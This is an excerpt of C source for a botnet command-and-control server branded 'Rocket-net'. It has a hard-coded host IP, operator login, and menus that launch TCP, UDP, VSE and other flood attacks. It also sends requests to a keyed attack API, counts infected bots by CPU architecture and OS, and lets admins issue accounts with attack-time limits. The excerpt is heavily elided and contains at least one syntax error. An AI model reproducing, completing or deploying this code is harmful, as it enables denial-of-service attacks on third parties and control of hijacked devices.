...
char *hostip = "101.99.94.80"; //Server Host IP

#define LOGINTRIGGER "1337"
#define ADMIN "admin"
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
...
struct iplogging {
    char ip[1024];
} ipstructure[MAXFDS];                                                                                                                                                                                                                                                                                                                                 //Astro-net and Akamai-net Prestented by Astros and Akamai
...
int apicall(char *type, char *ip, char *port, char *method, char *time)
{
    ...
    { 
        snprintf(request, sizeof(request), "GET API.php?key=RocketAPI&host=%s&port=%s&time=%s&method=%s HTTP/1.1\r\nHost: %s\r\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\r\nConnection: close\r\n\r\n", ip, port, time, method, apiip);
    }
...
loginprompt:
        ...
        sprintf(password, ""R"Password"W":"BLA" ", accounts[find_line].username);
...
void *TitleWriter(void *sock) 
{
    ...
    while(1) 
	{
        ...
        sprintf(string, "%c]0; Rocket Devices [%d] | [%s] - Users Online [ %d ]%c", '\033', BotsConnected(), accounts[datafd].username, OperatorsConnected, '\007');
		...
		if(motdaction == 1)
		sprintf(lmfao9asciibannerline0,   " "R"             MOTD"W":          %s\r\n", motd);
  		sprintf(lmfao9asciibannerline1,   " "R"        Rocket-net                 \r\n");
  		sprintf(lmfao9asciibannerline2,   " "R"                                   \r\n"); 
  		sprintf(lmfao9asciibannerline3,   " "R"                                   \r\n"); 
		...
		while(1) {
		char input [5000];
        sprintf(input, ""R"Rocket"W"@"R"%s"W": ", accounts[datafd].username);
		...
		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if(strstr(buf, "Edo")) {
				...
				char ops [2048];
				memset(statuscount, 0, 2048);
				sprintf(botcount,    ""R"Bots Connected"W": "R"%d\r\n", BotsConnected(), OperatorsConnected);		
				sprintf(statuscount, ""R"Duplicated Bots"W": "R"%d\r\n", TELFound, scannerreport);
				sprintf(ops,         ""R"Users Online"W": "R"%d\r\n", OperatorsConnected, scannerreport);
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "methods")) {
				...
				sprintf(hp1,  ""R"╔══════════════════════════════════════════════════╗\r\n");
				sprintf(hp2,  ""R"║!* TCP IP PORT TIME 32 all 1460 10 (TCP Flood)    ║\r\n");
				sprintf(hp3,  ""R"║!* UDP IP PORT TIME 32 1460 10     (UDP Flood)    ║\r\n");
				sprintf(hp4,  ""R"║!* STD IP PORT TIME 1024        (STDHEX Flood)    ║\r\n");
				sprintf(hp5,  ""R"║!* VSE IP PORT TIME 32 1024 10  (VSE Flood)       ║\r\n");
				sprintf(hp6,  ""R"║!* REDSYN IP PORT TIME         (REDSYN)           ║\r\n");
                sprintf(hp7,  ""R"║!* KILLALL IP PORT TIME 1024  (KILLALL)           ║\r\n");
				sprintf(hp8,  ""R"╚══════════════════════════════════════════════════╝\r\n");
        ...
        if(strstr(buf, "trigger off") && accounts[datafd].admin == 1)
        {
 		...
 		if(strstr(buf, "help")) {
            ...
            char helpc [800];
 			...
 			sprintf(help1, ""R"╔════════════════════════════════════════════╗\r\n");
 			sprintf(help8, ""R"║"W"methods  - Shows Attack methods             "R"║\r\n");
 			sprintf(help2, ""R"║"W"admin    - this is for admins only          "R"║\r\n");
 			sprintf(help3, ""R"║"W"bots     - Shows bot count and arch         "R"║\r\n");
 			sprintf(help4, ""R"║"W"oscount  - Shows OS of Devices              "R"║\r\n");
            sprintf(helpc, ""R"║"W"api      - Shows Api Attack Methods         "R"║\r\n");
 			sprintf(helpb, ""R"║"W"iplookup - iplookup [IP]                    "R"║\r\n");
 			sprintf(help5, ""R"║"W"plan     - Shows your max attack time       "R"║\r\n");
 			sprintf(helpe, ""R"║"W"Credit   - Shows The Devs of Rocket-net     "R"║\r\n");
 			sprintf(help6, ""R"║"W"clear    - Clears Screen                    "R"║\r\n");
 			sprintf(help7, ""R"╚════════════════════════════════════════════╝\r\n");
 			sprintf(helpa, ""R"                                      \r\n");
 			...
 			if(atoi(myhost) >= 8){
 				...
 				if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1){
                    ...
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0)){
...
#endif
                        sprintf(user, ""W"["R"IPLookup"W"] Getting Info For -> %s...\r\n", myhost);
                        if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
                        char ch;
                        int retrv = 0;
                        ...
                        else sprintf(user, ""W"["R"+"W"]--- "R"Results"W" ---["R"+"W"]\r\n"W"%s\r\n", iplbuffer);
                        if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
                    }
                    else{
#ifdef DEBUG
        ...
        if(strstr(buf, "credit")) {
			...
			sprintf(credit1,  ""R"╔════════════════════════════════════════════════════╗\r\n");
			sprintf(credit2,  ""R"║"W"          Astros, the sky is the limit.       "R"║\r\n");
			sprintf(credit3,  ""R"║"W"             Go beyond that limit.            "R"║\r\n");
			sprintf(credit6,  ""R"╚════════════════════════════════════════════════════╝\r\n");
        ...
        if(strstr(buf, "api")) {
            ...
            sprintf(api1,  ""R"╔═══════════════════════╗\r\n");
            sprintf(api2,  ""R"║"W" For API use apiattack "R"║\r\n");
            sprintf(api3,  ""R"║"W" API Methods:          "R"║\r\n");
            sprintf(api5,  ""R"║"W" SOAP                  "R"║\r\n");
            sprintf(api6,  ""R"║"W" IPX                   "R"║\r\n");
            sprintf(api7,  ""R"║"W" TCP-SACK              "R"║\r\n");
            sprintf(api8,  ""R"║"W" GRENADE               "R"║\r\n");
            sprintf(apiA,  ""R"║"W" OVH-NAT               "R"║\r\n");
            sprintf(apiB,  ""R"║"W" ARMA3                 "R"║\r\n");
            sprintf(apiC,  ""R"║"W" TCP-AMP               "R"║\r\n");
            sprintf(apiD,  ""R"║"W" UDPBypass             "R"║\r\n");
            sprintf(apiE,  ""R"║"W" WOLF                  "R"║\r\n");
            sprintf(apiF,  ""R"║"W" OpenVPN               "R"║\r\n");
            sprintf(apiG,  ""R"║"W" HTTP-GET              "R"║\r\n");
            sprintf(apiH,  ""R"║"W" OVH-X                 "R"║\r\n");
            sprintf(apiI,  ""R"║"W" HTTP-HEAD             "R"║\r\n");
            sprintf(apiJ,  ""R"║"W" HTTP-RAND             "R"║\r\n");
            sprintf(apiK,  ""R"║"W" HTTP-GOOGLE           "R"║\r\n");
            sprintf(apiL,  ""R"║"W" HTTP-NULL             "R"║\r\n");
            sprintf(apiM,  ""R"║"W" HTTP-BURST            "R"║\r\n");
            sprintf(apiN,  ""R"║"W" OVHBYPASSE            "R"║\r\n");
            sprintf(apiO,  ""R"╚═══════════════════════╝\r\n");
		...
		if(strstr(buf, "apiattack"))
        {
            ...
            if(accounts[datafd].accessapi == 1)
            {
                ...
                sprintf(beanersquad, ""R"Method"W": ");
                send(datafd, beanersquad, strlen(beanersquad), MSG_NOSIGNAL);
                memset(buf, 0, sizeof buf);
                fdgets(buf, sizeof(buf), datafd);
                trim(buf);
		...
		if(strstr(buf, "admin") || strstr(buf, "ADMIN"))
		{
			...
			if(accounts[datafd].admin == 1)
			{
                sprintf(sendbuf, ""R"╔════════════════════════════════════════════════════╗\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                sprintf(sendbuf, ""R"║"W" adduser Adduser  (Admin ONLY)                      "R"║\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                sprintf(sendbuf, ""R"║"W" deleteuser Removes User (Admin ONLY)               "R"║\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                sprintf(sendbuf, ""R"║"W" online Shows Online Users                          "R"║\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                sprintf(sendbuf, ""R"║"W" blacklist Blacklist Ips From Connecting To CNC     "R"║\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                sprintf(sendbuf, ""R"║"W" removeblacklist To Remove Blacklisted IPS          "R"║\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
                sprintf(sendbuf, ""R"╚════════════════════════════════════════════════════╝\r\n");
                send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
            }
		...
		*/
		if(strstr(buf, "STD") || strstr(buf, "TCP") || strstr(buf, "UDP") || strstr(buf, "VSE") || strstr(buf, "KILLALL"))
		{
			...
			{
				sprintf(senddata, ""R"Attack Sent!\r\n");
				send(datafd, senddata, strlen(senddata), MSG_NOSIGNAL);
        ...
        {  
            ...
            {
                sprintf(botnet, ""R"users "W"["R"%d"W"]\r\n\x1b[0m", OperatorsConnected);
            ...
            else
            {
                ...
                if(ppc != 0)
                {
                    sprintf(botnet, ""R"Rocket.powerpc "W"["R"%d"W"]\r\n\x1b[0m", ppc);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(sh4 != 0)
                {
                    sprintf(botnet, ""R"Rocket.sh4 "W"["R"%d"W"]\r\n\x1b[0m", sh4);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(x86 != 0)
                {
                    sprintf(botnet, ""R"Rocket.x86 "W"["R"%d"W"]\r\n\x1b[0m", x86);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv4 != 0)
                {
                    sprintf(botnet, ""R"Rocket.armv4 "W"["R"%d"W"]\r\n\x1b[0m", armv4);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv5 != 0)
                {
                    sprintf(botnet, ""R"Rocket.armv5 "W"["R"%d"W"]\r\n\x1b[0m", armv5);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv6 != 0)
                {
                    sprintf(botnet, ""R"Rocket.armv6 "W"["R"%d"W"]\r\n\x1b[0m", armv6);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv7 != 0)
                {
                    sprintf(botnet, ""R"Rocket.armv7 "W"["R"%d"W"]\r\n\x1b[0m", armv7);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(mips != 0)
                {
                    sprintf(botnet, ""R"Rocket.mips "W"["R"%d"W"]\r\n\x1b[0m", mips);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(m68k != 0)
                {
                    sprintf(botnet, ""R"Rocket.m68k "W"["R"%d"W"]\r\n\x1b[0m", m68k);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(debug != 0)
                {
                    sprintf(botnet, ""R"Rocket.debug "W"["R"%d"W"]\r\n\x1b[0m", debug);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(sparc != 0)
                {
                    sprintf(botnet, ""R"Rocket.sparc "W"["R"%d"W"]\r\n\x1b[0m", sparc);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(mipsel != 0)
                {
                    sprintf(botnet, ""R"Rocket.mipsel "W"["R"%d"W"]\r\n\x1b[0m", mipsel);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(unknown != 0)
                {
                    sprintf(botnet, ""R"Rocket.unknown "W"["R"%d"W"]\r\n\x1b[0m", unknown);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                sprintf(botnet, ""R"Total"W": ["R"%d"W"]\r\n\x1b[0m", clientsConnected());
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                if(accounts[find_line].maxbots < clientsConnected())
                {
                    sprintf(botnet, ""R"Available Bots "W"["R"%d"W"]\r\n\x1b[0m", accounts[find_line].maxbots);
                }
        ...
        {  
            ...
            else
            {
                ...
                if(ubuntu != 0)
                {
                    sprintf(botnet, ""R"Ubuntu "W"["R"%d"W"]\r\n\x1b[0m", ubuntu);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(gentoo != 0)
                {
                    sprintf(botnet, ""R"Gentoo "W"["R"%d"W"]\r\n\x1b[0m", gentoo);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(centos != 0)
                {
                    sprintf(botnet, ""R"CentOS "W"["R"%d"W"]\r\n\x1b[0m", centos);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(opensuse != 0)
                {
                    sprintf(botnet, ""R"OpenSUSE "W"["R"%d"W"]\r\n\x1b[0m", opensuse);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(freebsd != 0)
                {
                    sprintf(botnet, ""R"FreeBSD "W"["R"%d"W"]\r\n\x1b[0m", freebsd);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(dropbear != 0)
                {
                    sprintf(botnet, ""R"Dropbear "W"["R"%d"W"]\r\n\x1b[0m", dropbear);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(openwrt != 0)
                {
                    sprintf(botnet, ""R"OpenWRT "W"["R"%d"W"]\r\n\x1b[0m", openwrt);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(unknown != 0)
                {
                    sprintf(botnet, ""R"unknown "W"["R"%d"W"]\r\n\x1b[0m", unknown);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                sprintf(botnet, ""R"Total"W": ["R"%d"W"]\r\n\x1b[0m", clientsConnected());
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            ...
            { 
                ...
                { 
                    ...
                    char maxbots[100]; 
                    char uinfo[500]; 
                    sprintf(sendbuf, ""R"Username"W": "); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                    fdgets(buf, sizeof(buf), datafd);
                    trim(buf);
                    strcpy(usernametoadd, buf); 
                    memset(buf, 0, 2048); 
                    sprintf(sendbuf, ""R"Password"W": "); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                    fdgets(buf, sizeof(buf), datafd); 
                    trim(buf);
                    strcpy(passwordtoadd, buf); 
                    memset(buf, 0, 2048); 
                    sprintf(sendbuf, ""R"Admin"W": "); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                    fdgets(buf, sizeof(buf), datafd); 
                    trim(buf);
                    if(strstr(buf, "yes")) 
					...
					memset(buf, 0, 2048); 
                    sprintf(sendbuf, ""R"API Access"W": "); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                    fdgets(buf, sizeof(buf), datafd); 
                    trim(buf);
					if(strstr(buf, "yes")) 
                    ...
                    sprintf(sendbuf, ""R"Max Time: "W": "); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                    fdgets(buf, sizeof(buf), datafd); 
                    trim(buf);
                    strcpy(maxtime, buf); 
                    memset(buf, 0, 2048); 
                    sprintf(sendbuf, ""R"Max Bots: "W": "); 
                    send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 
                    fdgets(buf, sizeof(buf), datafd); 
                    trim(buf);
                    strcpy(maxbots, buf); 
			...
			if(strstr(buf, "cls") || strstr(buf, "clear")) 
			{
            ...
            char logoutmessage7 [2048];
            char logoutmessage8 [2048];
            char logoutmessage9 [2048];
            char logoutmessage10 [2048];
            char logoutmessage11 [2048];
            char logoutmessage12 [2048];
            char logoutmessage13 [2048];

			sprintf(logoutmessage1, "\e[90m        You Are Actively      \r\n");
			sprintf(logoutmessage2, "\e[90m        Being Logged Out      \r\n");
			sprintf(logoutmessage3, "\e[90m     _.-^^---....,,--- _      \r\n");
            sprintf(logoutmessage4; "\e[31m  _--                    --_  \r\n");
			sprintf(logoutmessage5, "\e[96m <                        >)  \r\n");
            sprintf(logoutmessage6, "\e[96m |,       Good Bye        ,|  \r\n");
            sprintf(logoutmessage7, "\e[96m  |._                   _.|   \r\n");
            sprintf(logoutmessage8, "\e[96m      ```--. . , ; .--'''     \r\n");
            sprintf(logoutmessage9, "\e[96m          | |   |             \r\n");
            sprintf(logoutmessage10,"\e[96m       .-=||  | |=-.          \r\n");
            sprintf(logoutmessage11,"\e[96m       `-=#$#&#$#=-'          \r\n");
            sprintf(logoutmessage12,"\e[96m          | ;  :|             \r\n");
			sprintf(logoutmessage13,"\e[34m _____.,-##&$@##&#~,.____     \r\n");
            ...
            trim(buf);
		char input [5000];
        sprintf(input, ""R"Astro-net And Akamai-net"W"@"R"%s"W": ", accounts[datafd].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
...
int main (int argc, char *argv[], void *sock) {
	    printf(""W"["R"Rocket"W"]\n");
	    printf(""W"["R"Made By @Astros and @Akamai"W"]\n");
        ...
        close (listenFD);
        return EXIT_SUCCESS;                                                                                                                                                                                                                                                                //Made By @Astros and @Akamai
}
